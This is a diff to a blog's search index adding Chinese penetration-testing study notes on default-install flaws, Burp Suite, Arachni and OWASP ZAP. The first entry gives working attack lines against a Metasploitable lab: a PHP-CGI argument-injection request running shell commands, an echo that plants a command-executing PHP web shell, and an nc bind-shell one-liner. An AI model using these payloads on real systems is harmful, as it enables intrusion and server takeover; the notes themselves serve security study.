@@ -4,11 +4,65 @@
   
     
     <entry>
-      <title>Web扫描工具-Arachni</title>
-      <link href="/2020/10/12/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Arachni/"/>
-      <url>/2020/10/12/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Arachni/</url>
+      <title>手动漏洞挖掘-1.默认安装</title>
+      <link href="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
+      <url>/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</url>
       
-        <content type="html"><![CDATA[<h3 id="Web扫描器-Arachni"><a href="#Web扫描器-Arachni" class="headerlink" title="Web扫描器-Arachni"></a>Web扫描器-Arachni</h3><ul><li><p>官网</p><ul><li><a href="https://www.arachni-scanner.com/" target="_blank" rel="noopener">https://www.arachni-scanner.com/</a></li></ul></li><li><p>支持分布式扫描</p></li><li><p>支持调度，每隔多久扫描一次</p></li><li><p>安装后，输入用户名密码登录提示错误，google发现很多人有同样错误，暂时无解。</p></li></ul><a id="more"></a>]]></content>
+        <content type="html"><![CDATA[<h3 id="手动漏洞挖掘-1-默认安装"><a href="#手动漏洞挖掘-1-默认安装" class="headerlink" title="手动漏洞挖掘-1.默认安装"></a>手动漏洞挖掘-1.默认安装</h3><ul><li><p>Windows默认安装漏洞</p></li><li><p>phpMyAdmin/setup</p><ul><li><p>MetaSploitable</p><ul><li><p>```<br>POST http:///phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1<br>Host: 192.168.20.10<br>Content-Length: 40</p><?phppassthru('pwd&&ls'); die();?><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>  - ![](pic1.png)<br><br><br>&lt;!--more--&gt;<br><br>- 写入webshell<br><br>  -<br></code></pre></td></tr></table></figure><p>echo”<?php\$cmd=\$_GET["cmd"];system(\$cmd);?>“&gt;/var/www/3.php</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>- PHP反弹shell<br><br>  - &#96;&#96;&#96;&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php<br></code></pre></td></tr></table></figure></li><li><p>直接把内容用burp发送，然后在本地用nc侦听，记得修改php文件里面的ip地址</p></li></ul></li><li><p>侦听shell</p><ul><li><pre><code>echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe|nc -nlp 4444 &gt; /tmp/pipe&apos;);</code></pre></li></ul></li><li><p>File</p><ul><li>如果当前用户没有权限执行ifconfig，先用whereis 查看ifconfig的路径，然后到目录下使用./执行。</li></ul></li></ul></li><li><p>Ubuntu/Debian默认安装PHP5-cgi</p></li><li><p>可直接访问/cgi-bin/php5和/cgi-bin/php(爬不出来的目录</p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路：先检查默认安装的软件是否有相关漏洞</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web扫描工具-Burpsuite</title>
+      <link href="/2020/10/14/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Burpsuite/"/>
+      <url>/2020/10/14/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Burpsuite/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><ul><li>Web安全工具中的瑞士军刀</li><li>统一的集成工具发现全部现代安全漏洞</li><li>PortSwigger公司开发<ul><li>Burp Free</li><li>Burp Professional</li><li><a href="http://www.portswigger.net" target="_blank" rel="noopener">http://www.portswigger.net</a></li></ul></li><li>所有的工具共享一个能处理并显示HTTP消息的可拓展框架，模块之间无缝交换信息。</li></ul><a id="more"></a><ul><li>字体调成中文</li></ul><h4 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h4><ul><li>Options<ul><li>Invisible（主机头/多目标域名）</li><li>CA（导入/导出）</li></ul></li></ul><h4 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h4><ul><li>Position<ul><li>Sniper<ul><li>逐一变量进行内容插入，其它变量不变</li></ul></li><li>Battering ram<ul><li>两个位置同时插入同样值</li></ul></li><li>Pitchfork<ul><li>成对</li></ul></li><li>Cluster bomb<ul><li>尝试所有排列组合</li></ul></li></ul></li><li>熟悉操作</li></ul><h4 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h4><ul><li>熟悉操作</li></ul><h4 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h4><ul><li>分析程序中可预测的数据<ul><li>Session cookies</li><li>anti-CSRF tokens</li><li>Start live capture<ul><li>Analyze(数据越多分析越准确)</li><li>伪随机数算法</li><li>Character-level</li><li>Bit-level</li></ul></li></ul></li><li>FIPS——美国联邦信息处理标准（Federal Information Processing Standard）</li></ul><h4 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h4><ul><li>熟悉操作</li></ul><h4 id="Compare"><a href="#Compare" class="headerlink" title="Compare"></a>Compare</h4><ul><li>熟悉操作</li></ul><h3 id="其它扫描器"><a href="#其它扫描器" class="headerlink" title="其它扫描器"></a>其它扫描器</h3><ul><li><p>AWVS</p></li><li><p>AppScan</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web扫描工具-Arachni</title>
+      <link href="/2020/10/12/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Arachni-OWASP_ZAP/"/>
+      <url>/2020/10/12/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Arachni-OWASP_ZAP/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h3><ul><li><p>官网</p><ul><li><a href="https://www.arachni-scanner.com/" target="_blank" rel="noopener">https://www.arachni-scanner.com/</a></li></ul></li><li><p>支持分布式扫描</p></li><li><p>支持调度，每隔多久扫描一次</p></li><li><p>安装后，输入用户名密码登录提示错误，google发现很多人有同样错误，暂时无解。</p></li></ul><a id="more"></a><h3 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h3><ul><li>Zed attack proxy</li><li>WEB Application继承渗透测试和漏洞挖掘工具</li><li>开源免费快平台简单易用</li><li>截断代理</li><li>主动、被动扫描</li><li>Fuzzy、暴力破解</li><li>API<ul><li><a href="http://zap/" target="_blank" rel="noopener">http://zap/</a></li></ul></li><li>功能<ul><li><code>netstat -pantu</code>发现zap自动在8080端口打开 代理，通过该代理访问的网页会显示在zap中</li><li>Mode–Safe、Protected、Standard、ATTACK</li><li>升级add-ons</li><li>ScanPolicy</li><li>Anti CSRF Tokens</li><li>https–CA<ul><li>把ZAP的证书导入到浏览器成信任的证书</li><li>在设置的Dynamic SSL Certificates里面</li></ul></li><li>Scope/Context/filter</li><li>Http Sessions</li><li>扫描结果可以添加Note/Tag</li><li>小绿点：截断。小灯泡：显示隐藏域。</li></ul></li></ul><h4 id="扫描工作流程"><a href="#扫描工作流程" class="headerlink" title="扫描工作流程"></a>扫描工作流程</h4><ul><li>设置代理</li><li>手动爬网</li><li>自动爬网</li><li>主动扫描</li></ul>]]></content>
       
       
       <categories>
